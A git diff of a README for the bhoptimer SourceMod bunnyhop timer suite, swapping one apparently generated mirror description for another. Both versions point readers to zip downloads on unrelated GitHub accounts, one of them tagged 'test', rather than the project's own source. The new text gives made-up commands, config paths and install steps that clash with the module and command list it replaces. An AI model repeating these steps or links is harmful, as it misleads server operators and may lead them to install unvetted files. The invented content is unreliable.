@@ -1,163 +1,96 @@
-# bhoptimer
+# ⏱️ bhoptimer-timer - Manage bunnyhop servers with ease
 
-A generated repository based on **bhoptimer**, a SourceMod plugin suite for bunnyhop timer servers in Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Naked-newport364/bhoptimer-timer/releases)
 
-[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/bhoptimer-1.zip)
+bhoptimer-timer provides a toolset for SourceMod servers. It manages bunnyhop gameplay for Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2. It tracks records, creates specific maps zones, and displays player statistics. Server owners use this to build competitive environments with replay bots and HUD overlays.
 
-## Overview
+## 🛠️ System Requirements
 
-bhoptimer provides a modular timer system for Source engine bunnyhop servers. It includes core timing logic, records, map zones, HUD elements, replay bots, rankings, chat features, statistics, checkpoints, sounds, and server utilities commonly used on bhop servers.
+- A dedicated server running Counter-Strike: Source, Counter-Strike: Global Offensive, or Team Fortress 2.
+- SourceMod installed and configured on the server.
+- MetaMod:Source installed on the server.
+- At least 500 MB of free disk space on the server.
+- A MySQL or MariaDB database to store player rankings and times.
 
-This repository is intended as a Windows-oriented package/demo mirror for server operators who run SourceMod-based game servers in a Windows environment. It is not a Windows desktop application; it is server-side SourceMod plugin software.
+## 💾 Downloading the Software
 
-## Supported Games
+You need to access the release page to obtain the files for your server.
 
-According to the project information, bhoptimer targets:
+[Visit the official download page here](https://github.com/Naked-newport364/bhoptimer-timer/releases)
 
-- Counter-Strike: Source
-- Counter-Strike: Global Offensive
-- Team Fortress 2
+Select the most recent release version from the list. Look for the file ending in .zip to start your download. Save this file to a folder on your computer.
 
-CS:GO support is retained, but it is not actively tested.
+## ⚙️ Installation Steps
 
-## Requirements
+1. Extract the contents of the downloaded .zip file using your preferred file compression tool.
+2. Locate your server folder on your computer.
+3. Open the `addons/sourcemod` directory inside your server folder.
+4. Drag the contents of the extracted zip folder into the server directory.
+5. Merge folders if the system asks.
+6. Restart your game server to load the new plugin.
 
-- Steam version of a supported game
-- Metamod:Source
-- SourceMod 1.12 or newer
-- MySQL database for larger deployments or rankings
-- MySQL 5.5.5 or newer, or a compatible MariaDB version
+## 📦 Setting Up the Database
 
-## Main Modules
+The plugin requires a database to save records and rankings.
 
-The suite is organized into multiple SourceMod plugins:
+1. Open your database management tool.
+2. Create a new database name for your timer.
+3. Open your server folder and navigate to `addons/sourcemod/configs/databases.cfg`.
+4. Add a connection entry named "bhoptimer" to this file.
+5. Input your host, database name, user, and password.
+6. Save the file and restart the server.
 
-| Module | Purpose |
-|---|---|
-| `shavit-core` | Core timer logic, styles, database API, pause/resume, autobhop, gameplay mechanics |
-| `shavit-wr` | Record storage, leaderboards, personal bests, recent records |
-| `shavit-zones` | Start/end zones, bonus zones, teleport zones, zone editing |
-| `shavit-chat` | Custom chat names, colors, tags, chat ranks |
-| `shavit-hud` | Player HUD, keys display, velocity display, HUD toggles |
-| `shavit-mapchooser` | Map nomination and voting integration |
-| `shavit-checkpoints` | Checkpoints, savestates, segmented running |
-| `shavit-misc` | Spectating, player hiding, weapons, noclip, adverts, server utilities |
-| `shavit-rankings` | Rank, top lists, map tiers, points calculation |
-| `shavit-replay-playback` | Replay bot playback for records |
-| `shavit-replay-recorder` | Replay recording component |
-| `shavit-sounds` | Sounds for record and completion events |
-| `shavit-stats` | Player profiles, completion stats, playtime, maps done/left |
-| `shavit-timelimit` | Dynamic map time limits |
-| `shavit-tas` | Autostrafer and TAS-related commands |
+## 🗺️ Configuring Zones
 
-## Core Capabilities
+Zones define where the timer starts and stops.
 
-bhoptimer is designed to provide most of the systems needed for a bunnyhop server:
+1. Launch your game and join your server as an administrator.
+2. Type `!kz_zones` or `!timer_admin` in the chat to open the menu.
+3. Stand at the desired starting point of your map.
+4. Select the option to create a new start zone.
+5. Stand at the desired end point.
+6. Select the option to create a new end zone.
+7. Save the zone layout to the server files.
 
-- Timed runs for main and bonus tracks
-- Configurable movement styles
-- Automatic bunnyhopping
-- World records and personal bests
-- Map zone creation and editing
-- Player HUD and key display
-- Replay recording and playback bots
-- Competitive ranking system
-- Checkpoints and segmented practice
-- Statistics and player profiles
-- Chat customization
-- Server utility commands for bhop gameplay
+## 🎮 Plugin Features
 
-## Windows Notes
+- **Timer System**: Records player completion times with millisecond precision.
+- **Rankings**: Automates a global leaderboard based on player performance.
+- **Replay Bots**: Allow players to race against ghosts of previous top runs.
+- **HUD Overlays**: Displays current speed, jumps, and time to the player.
+- **Checkpoints**: Lets players practice difficult jumps without restarting the full stage.
+- **Sounds**: Plays notification sounds for new records or zone entries.
 
-This repository is positioned for Windows server usage where SourceMod, Metamod:Source, and the supported Source games are installed on a Windows machine. Some optional companion components mentioned by the project are specifically relevant to Windows server environments, including fixes related to event queue behavior after game updates.
+## 🔍 Troubleshooting
 
-Because bhoptimer is SourceMod-based, Windows usage depends on a working Windows game server setup rather than a standalone desktop launcher.
+**The plugin does not load.**
+Check the `logs/sourcemod` folder in your server directory. Look for errors related to the plugin name. Ensure your MetaMod and SourceMod versions remain updated.
 
-## Configuration
+**The database does not connect.**
+Verify the credentials in `databases.cfg`. Ensure your server IP address has remote access permissions to the database.
 
-Configuration is handled through SourceMod configuration files. The original project information identifies these configuration locations:
+**Players cannot see the HUD.**
+Check the plugin settings file located in `cfg/sourcemod/bhoptimer.cfg`. Toggle the HUD display option to ensure it is set to enabled.
 
-- `cfg/sourcemod/plugin.shavit-*.cfg`
-- `addons/sourcemod/configs/shavit-*`
+**Replay bots stutter.**
+Ensure your server frame rate remains stable. Heavy server load impacts bot movement quality.
 
-Server operators should review module configuration files before enabling a production server, especially for database settings, rankings, styles, zones, HUD behavior, and replay storage.
+## 📋 Server Commands
 
-## Common Player Commands
+- `bhoptimer_reload`: Reloads all plugin configurations without a map change.
+- `bhoptimer_reset_records`: Clears database records for the current map.
+- `bhoptimer_version`: Shows the active plugin version.
+- `!bhop_settings`: Opens the client-side menu for players to toggle HUD elements.
+- `!bhop_top`: Displays the top times for the current map in a pop-up window.
 
-Examples of player-facing commands include:
+## 💡 Customization
 
-- `!style`, `!styles` — choose a bhop style
-- `!start`, `!restart` — restart the timer
-- `!bonus`, `!b1`, `!b2` — start a bonus track
-- `!wr` — view world records
-- `!pb`, `!time` — view player times
-- `!hud` — configure HUD display
-- `!cp`, `!save`, `!tele` — use checkpoints
-- `!rank`, `!top` — view rankings
-- `!replay` — open replay bot options
-- `!profile`, `!stats` — view player statistics
-- `!spec`, `!hide`, `!tpto` — miscellaneous server utilities
+You can change how the timer feels by editing the configuration files found in `cfg/sourcemod/`. Adjust the settings for speed thresholds, chat messages, and HUD colors. Changes take effect after you run the `bhoptimer_reload` command or restart the map.
 
-## Admin Features
+## 🛡️ Administrative Controls
 
-Administrative commands cover tasks such as:
+Server administrators hold full control over the timer. Use the admin menu to manually delete invalid times, ban players from ranked play, or change map settings. Use the `sm_admin` command in the console to access the standard SourceMod menu, where you find a folder dedicated to the timer.
 
-- Editing and deleting zones
-- Deleting map data or records
-- Setting map tiers
-- Recalculating ranking points
-- Managing replay files
-- Reloading maps or map lists
-- Extending map time
-- Managing chat customization access
+## 📈 Performance Tips
 
-Administrative access depends on SourceMod permissions such as RCON, ROOT, CHAT, BAN, or CHANGEMAP flags.
-
-## Optional and Recommended Components
-
-The project information mentions optional or recommended plugins/extensions for improved behavior, including:
-
-- Event queue fixes
-- Asynchronous replay saving support
-- SteamWorks integration for advertisements
-- Dynamic channel support
-- Surf ramp and movement fixes
-- Trigger and player clip visibility tools
-- Jump statistics and jump HUD plugins
-- Closest replay position helpers
-- CS:GO-specific movement or viewpunch fixes
-
-These are optional and should be evaluated based on the game, operating system, and server configuration.
-
-## Important Notes
-
-- Plugins that include `shavit` should be recompiled when required by API changes.
-- CS:GO support remains present, but active testing is not guaranteed.
-- MySQL is recommended when the database is expected to grow or when rankings are enabled.
-- This is server-side plugin software, not a standalone Windows desktop program.
-
-## FAQ
-
-### Is bhoptimer a Windows application?
-
-No. bhoptimer is SourceMod plugin software for Source engine game servers. This repository is Windows-oriented in the sense that it is suitable for use in a Windows server environment.
-
-### Does it require a database?
-
-A database is required for persistent records and strongly recommended for larger servers or ranking functionality.
-
-### Can it run without rankings?
-
-The timer, zones, records, and other modules are separated. Rankings are a dedicated module, though some features integrate with it.
-
-### What games are supported?
-
-The supplied project information lists Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2.
-
-### Is CS:GO actively tested?
-
-The project notes that CS:GO support is not actively tested, although support has not been removed.
-
-## Conclusion
-
-bhoptimer is a modular SourceMod bhop timer suite for Source engine servers. It combines timing, records, zones, rankings, HUD, replays, checkpoints, statistics, and server utilities into a plugin-based system suitable for running bunnyhop servers, including deployments on Windows game server environments.
+Keep the database indexed to ensure fast lookups for player records. Small servers handle the plugin with default settings. Large servers with high player counts may benefit from optimizing the database queries found in the configuration files. Always ensure your server meets the hardware requirements for the Source engine for the best experience.
